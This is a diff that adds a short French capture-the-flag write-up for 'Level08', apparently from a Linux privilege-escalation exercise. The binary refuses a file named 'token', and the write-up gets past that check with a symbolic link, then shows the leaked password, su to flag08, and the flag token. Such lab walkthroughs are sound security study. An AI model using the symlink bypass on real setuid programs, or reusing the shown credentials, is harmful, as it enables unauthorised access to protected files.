@@ -1,0 +1,20 @@
+Level08
+Un binaire "level08" et un fichier token sont presents.
+Le binaire attend un file mais n'accepte pas token.
+$> ./level08 token
+You may not access 'token'
+
+$> echo "toto" > /tmp/test
+$> ./level08 /tmp/test
+toto
+
+On presume que l'on doit trouver un moyen d'utiliser token avec avec level08 donc de faire une copie ou un lien.
+Sachant que nous n'avons pas les droits on essaye de faire un lien symbolique
+
+$> ln -s ~/token /tmp/touken
+$> ./level08 /tmp/touken
+quif5eloekouj29ke0vouxean
+$> su flag08
+Password: quif5eloekouj29ke0vouxean
+$> getflag
+Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
